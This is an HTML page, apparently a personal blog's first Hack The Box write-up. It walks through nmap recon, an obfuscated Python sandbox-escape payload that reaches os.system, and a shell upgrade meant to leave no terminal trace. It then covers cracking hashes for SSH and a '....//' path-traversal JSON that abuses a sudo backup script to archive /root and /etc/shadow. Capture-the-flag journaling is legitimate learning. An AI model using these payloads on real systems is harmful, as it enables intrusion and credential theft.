@@ -1,0 +1,188 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <title>
+            write-up-1
+        </title>
+        <link rel="stylesheet" href="global.css">
+        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-tomorrow.min.css">
+        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js">
+        
+    </head>
+    <body>
+        <div class="topnav-container">
+            <div class="topnav-2">
+                <a href="index.html"><img src="main\assets\logo.png"></a>
+            </div>
+            <div class="topnav-1">
+                <a href="resume.html">resume</a>
+                <a href="write_up_index.html">write-ups</a>
+                <a href="bio.html">bio</a>
+            </div>    
+        </div>
+        <!--<div class="content-container">
+            <h2>this is content title</h2>
+            <p>This is the write up template content para</p>
+            <div class="code-container">
+                <button class="copy-btn" onclick="copyCode()">📋</button>
+                <pre class="code-box" id="code-snippet"><code class="language-html">&lt;h1&gt;Hello, World!&lt;/h1&gt;</code></pre>
+            </div>
+            <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-tomorrow.min.css"></script>
+            <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js"></script>
+            <script src="main\js\copy-code.js"></script>
+            <div class="code-container">
+                <pre class="code-box" id="code-snippet"><code class="language-bash">output template</code></pre>
+            </div>
+        </div>-->
+        <div class="content-container">
+            <h2>Python Interpreter Breakout</h2>
+            <p>This write-up is special because a; its my first, and b; it was the first time in the 9 odd months I've been practicing these skills that I managed to run through this challenge without outside assistance. I have purposely ommited the name of the HTB Code box from the title as I wanted to focus on the environment and the underlying challenge.<br><br>
+            
+            So without further preamble, let's dive in!<br><br></p>
+            <h3>RECON</h3>
+
+            <div class="code-container">
+                <button class="copy-btn" onclick="copyCode()">📋</button>
+                <pre class="code-box" id="code-snippet"><code class="language-bash">nmap -Pn -sSV -O target-ip
+                </code></pre>
+            </div>
+            <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-tomorrow.min.css"></script>
+            <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js"></script>
+            <script src="main\js\copy-code.js"></script>
+            <div class="code-container">
+                <pre class="code-box" id="code-snippet"><code class="language-bash">PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
+5000/tcp open  http    Gunicorn 20.0.4
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</code></pre>
+            </div>
+
+            <p>My go to for challenge port-mapping. I've got a more thorough scan for more secure targets, as well as some variations for IDS evasion and to avoid network disruption, but for these challenges this one is a good start point.<br><br>
+
+            In this instance we have a linux box with two ports, 22 and 5000 are open. 22 is an easy one, and I'll file that away for later foothold or privesc tactics. For now I want to concentrate on port 5000, and the associated service and version: http tells me its accessible via web, and we can make a quick note of the Gunicorn version 20.0.4 for later research. I could have looked it up at this point and discovered it's a python web application server, but I like to see and 'feel' things myself before I hit the figurative books.<br><br>
+
+            No suprise on visiting the site via Burp proxy that its a web python interpreter. Python goes in one side and is compiled in the other. Nice. Immediate red flag when code is being compiled in this kind of environment but I like to be thorough, even when I can see the approach, so I run feroxbuster to get a feel for the web server's construction and just in case there are any vulnerable files I can exfiltrate.<br><br>
+
+            Time to do a bit of research. Http smuggling seemed to be an interesting path to go down, although header analysis in Burp made it clear there was no reverse proxy in play. Even so I loved learning about it, and have filed it away for another time... Back to our box, no more vulnerabilites looked like they could obtain access to the server so I went back to my first hunch - how can we abuse the web application?<br><br>
+
+            So here is where I usually fall down in ethical hacking challenges: I'm not a programmer, and because I came late to the IT party I am constantly playing catchup with coding. Back to the books. Full credit to Reelix <a href="https://www.reelix.za.net/2021/04/the-craziest-python-sandbox-escape.html">here</a> for his amazing ctf write-up.<br><br></p>
+            <h3>APPROACH</h3>
+            <p>After following the guide, learning a shit-ton about python imports and how sandbox environments work, I had established that the anti-abuse mechanism in place was a simple filter. Input was sanitised before it was passed into the compiler, with keywords in the python language being blocked. The solution was this:</p>
+
+            <div class="code-container">
+                <button class="copy-btn" onclick="copyCode()">📋</button>
+                <pre class="code-box" id="code-snippet"><code class="language-python">bi=().__class__.__bases__(0).__subclasses__()[84]().load_module('snitliub'[::-1]);
+imp_str = ('__tropmi__'[::-1]);
+imp_func = getattr(bi, imp_str);
+so = imp_func('so'[::-1]);
+sys_str = ('metsys'[::-1]);
+sys_func = getattr(so, sys_str);
+sys_func('id')
+print(sys_func('id'));
+                </code></pre>
+            </div>
+            <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-tomorrow.min.css"></script>
+            <script src="main\js\copy-code.js"></script>
+            <p>First, most of the time when programmers see my code they either get mad or really sad, I know this and I wear it. For now this is what I can do, and low and behold I was getting a '0' return on my compiler output - the code had been successfully executed. If none of that makes senese I am not the one to explain it. I would highly reccomend reading the above article and doing a bit of research; trust me, you will come out of it much much wiser!<br><br>
+            
+            From here I advanced the code to give me terminal output throuhg the web aplication so I had a bit more verbosity, then finally executed a bash reverse shell. With netcat listening on my quirky preferred port, we had a somewhat volatile shell.<br><br>
+
+            <h3>FOOTHOLD</h3>
+        
+            One of my earliest obfuscation lessons was upgrading a shell and redirecting its output into null to avoid leaving terminal evidence:</p>
+            <div class="code-container">
+                <button class="copy-btn" onclick="copyCode()">📋</button>
+                <pre class="code-box" id="code-snippet"><code class="language-bash">SHELL=/bin/bash script -q /dev/null</code></pre>
+            </div>
+            <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js"></script>
+            <script src="main\js\copy-code.js"></script>
+            <p>Simple and effective and allows just enough upgrade to keep moving. I got my bearings, oriented myself and was suprised to find I was in /home already as app-user. My experience so far from incursion via web servers is being dropped into var-www as a low level user. This time I got lucky, and a quick scan of surrounding directories discovered a database.db. Python web servers are sublime ways of exfiltrating data or dropping in tools and if you are unfamiliar with them please <a href="https://realpython.com/python-http-server/">check them out</a>! Two hashes, and a few rounds of 'guess the hash code' with hashcat and I had a set of credentials for ssh.<br><br>
+            
+            <h3>PRIVESC</h3>
+            <p>Once an ssh session is opened:</p>
+            <div class="code-container">
+                <button class="copy-btn" onclick="copyCode()">📋</button>
+                <pre class="code-box" id="code-snippet"><code class="language-bash">sudo -l</code></pre>
+            </div>
+            <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-tomorrow.min.css"></script>
+            <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js"></script>
+            <script src="main\js\copy-code.js"></script>
+            <div class="code-container">
+                <pre class="code-box" id="code-snippet"><code class="language-bash">User martin may run the following commands on localhost:
+    (ALL : ALL) NOPASSWD: /usr/bin/backy.sh</code></pre>
+            </div>
+            <p>The amazing thing about the journey of ethical hacking is when you start, especially from a non-IT background, it seems almost overwhelming. Nothing seems to make any sense, let alone lead to somehow taking over a machine. Then suddenly you get it, and you look at this output as if someone had just handed you the keys to a locked door.<br><br>
+            
+            My hijacked user can execute backy.sh, a shell script, with super-user privilege. Time to look at the script:</p>
+            <div class="code-container">
+                <button class="copy-btn" onclick="copyCode()">📋</button>
+                <pre class="code-box" id="code-snippet"><code class="language-bash">cat /usr/bin/backy.sh</code></pre>
+            </div>
+            <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-tomorrow.min.css"></script>
+            <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js"></script>
+            <script src="main\js\copy-code.js"></script>
+            <div class="code-container">
+                <pre class="code-box" id="code-snippet"><code class="language-bash">#!/bin/bash
+
+if [[ $# -ne 1 ]]; then
+    /usr/bin/echo "Usage: $0 &lt;task.json&lt;"
+    exit 1
+fi
+
+json_file="$1"
+
+if [[ ! -f "$json_file" ]]; then
+    /usr/bin/echo "Error: File '$json_file' not found."
+    exit 1
+fi
+
+allowed_paths=("/var/" "/home/")
+
+updated_json=$(/usr/bin/jq '.directories_to_archive |= map(gsub("\\.\\./"; ""))' "$json_file")
+
+/usr/bin/echo "$updated_json" > "$json_file"
+
+directories_to_archive=$(/usr/bin/echo "$updated_json" | /usr/bin/jq -r '.directories_to_archive[]')
+
+is_allowed_path() {
+    local path="$1"
+    for allowed_path in "${allowed_paths[@]}"; do
+        if [[ "$path" == $allowed_path* ]]; then
+            return 0
+        fi
+    done
+    return 1
+}
+
+for dir in $directories_to_archive; do
+    if ! is_allowed_path "$dir"; then
+        /usr/bin/echo "Error: $dir is not allowed. Only directories under /var/ and /home/ are allowed."
+        exit 1
+    fi
+done</code></pre>
+            </div>
+            <p>Interesting stuff. A bash script that initiates task.json, and judging by its inputs, it has a backup or achiving function. And seems to take absolute paths from a .json input file... There is a bit of gsub sanitisation going on but manipulating regular expressions is a relatively easy task. Gsub is filtering three characters in sequence, "../", to avoid the exact thing I want to do: Path traversal. If the gsub function only targets instances of these three characters in sequence, and appears to only pass once, what happens if we pass a value to the input file with "." and "/" nested in the path?</p>
+            <div class="code-container">
+                <button class="copy-btn" onclick="copyCode()">📋</button>
+                <pre class="code-box" id="code-snippet"><code class="language-json">{
+"destination": "/home/martin/backups/",
+"multiprocessing": true,
+"verbose_log": true,
+"directories_to_archive": [
+
+        "/var/....//....//root/",
+        "/var/....//....//etc"
+],
+
+"exclude": [
+        ".1"    
+]
+}</code></pre>
+            </div>
+            <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-tomorrow.min.css"></script>
+            <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js"></script>
+            <script src="main\js\copy-code.js"></script>
+            <p>Calling my python server into action again, I exfiltrate the archived zips and opened them on my end. Just like that we have the root flag, and /etc/shadow for good measure and proof of full compromise.<br><br>
+            
+            So there it is, my first solo box and my first write-up. This is not a technical manual, or intended to educate hackers already proficient in their craft, but more as a way of journaling my progress and journey, and perhaps helping out other operators at the beginning of their journeys. Happy hunting!</p>
+            </body>
